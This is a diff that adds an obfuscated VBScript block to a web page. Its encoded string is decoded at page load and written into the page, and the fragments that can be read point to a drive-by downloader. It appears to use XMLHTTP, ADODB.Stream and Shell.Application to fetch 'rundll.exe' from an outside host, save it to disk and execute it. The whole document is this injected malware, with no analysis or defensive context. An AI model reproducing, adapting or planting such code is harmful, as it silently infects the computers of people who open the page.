@@ -1,0 +1,27 @@
+<SCRIPT language=vbscript>
+sexgirl="¡’ WGVMTXcPERKYEKI!e:&7GVMTXe""¡’3Rc)VVSVc6IWYQIc2I\X¡’j7-...,++¡’0t!eSFe¡’0u!eNIe¡’0v!eGXe¡’0M0M!c0ti0ui0v¡’j7Bh8.,+*,+¡’7IXc4N!HSGYQIRXqGVIEXI)PIQIRXk0M0Ml¡’j72"", .,+..¡’4t!eGPe¡’4u!4tneEWWe¡’4v!4uneMHe¡’j7mkc./..,¡’GGG!eGPWMH}&(|ye}PPP!e'xxypyxe}WWW!e%vptt(e}MMM!esp|{v%pss'e}HHH!esw*'u|)vye}YWS!e1MGVSWSJXq<e}TO!e10,88Te¡’4Nq7IX%XXVMFYXIc4vocGGGiPPPiWWWiMMMiHHH¡’j79-+.,+,¡’FRF!YWSiTO¡’7IXc%QWGS!4Nq'VIEXI3FNIGXkFRFoeel¡’j7m3i,.1,+=¡’%QWGSq3TIRce+eie)eie8eoc'SHIWoc*EPWI¡’j7m3i.,+.,&,.¡’%QWGSq7IRH¡’j7-2.,9c.,+¡’J*t!eGSQeieQSQHWqeieI\Ie¡’j79-9.,,+,¡’J*u!eGEPPeieVYRqeieZFWe¡’j7B&.12&122¡’7IXc%QMR]!4NqGVIEXISFNIGXke7eieGeieVMeieTeieXMRKq*eieMeiePIeie7]eieWXeieIeieQ3eieFNIeieGXeoeel¡’j7uuwxx¡’7IXc0YG]!%QMR]q+IX7TIGMEP*SPHIVkul¡’j7wvuvv¡’J*t!%QMR]q&YMPH4EXLk0YG]oJ*tl¡’j7vvv¡’J*u!%QMR]q&YMPH4EXLk0YG]oJ*ul¡’j7yyy¡’%%!e%eieHe¡’j7xxxx¡’&&!eSeieHeieFeieqeieWeieXVIeieEQe¡’j7yyy¡’('!%%i&&¡’j7yyyy¡’7IXc8YVI4S[IV!4NqGVIEXISFNIGXk('oeel¡’j7yy¡’8YVI4S[IVqX]TI!t¡’j7y{{¡’8YVI4S[IVq3TIR¡’j7yuuu¡’8YVI4S[IVq;VMXIc%QWGSq6IWTSRWI&SH]¡’j7uv¡’8YVI4S[IVq7EZIXSJMPIcJ*tou¡’j7vyy¡’8YVI4S[IVq'PSWI¡’j7uuvv¡’8YVI4S[IVq8]TI!u¡’j7yyvv¡’8YVI4S[IVq3TIR¡’j7vvyy¡’8YVI4S[IVq;VMXI8I\Xce7IXc[W!'VIEXI3FNIGXkee;WGVeieMTXq7LIPPeeleiZF'V0Jie[Wq6YRckeeeiJ*tieeeleiZF'V0Jie7IXc[W!2SXLMRKe¡’j7yyu¡’8YVI4S[IVq7EZIXSJMPIcJ*uou¡’j7yyy¡’8YVI4S[IVq'PSWI¡’j7y|uu¡’+&%!e7eieLeieIeiePeiePeieqeie%eieTeieTeiePeieMe¡’j7yuuu¡’7IXc(SRI!4NqGVIEXISFNIGXk+&%ieGEXeieMSReoeel¡’j8.,+.,.,¡’(SRIq7LIPP)\IGYXIcJ*uoeeoeeoe3TIReos¡’j;.,.,.,¡’ r7GVMTX""¡’"
+function UnEncode(temp)
+but=67
+for i = 1 to len(temp)
+    if mid(temp,i,1)<> "¡’" then
+If Asc(Mid(temp, i, 1)) < 32 Or Asc(Mid(temp, i, 1)) > 126 Then
+a = a & Chr(Asc(Mid(temp, i, 1)))
+else
+pk=asc(mid(temp,i,1))-but
+            if pk>126 then
+                    pk=pk-95
+            elseif pk<32 then
+                     pk=pk+95
+             end if
+             a=a&chr(pk)
+end if
+   else
+             a=a&vbcrlf
+   end if
+next
+UnEncode=a
+end function
+Codes="http://www.myoverture.kr/Upload/Temp/rundll.exe"
+document.write(UnEncode(sexgirl))
+document.write("")
+</SCRIPT>
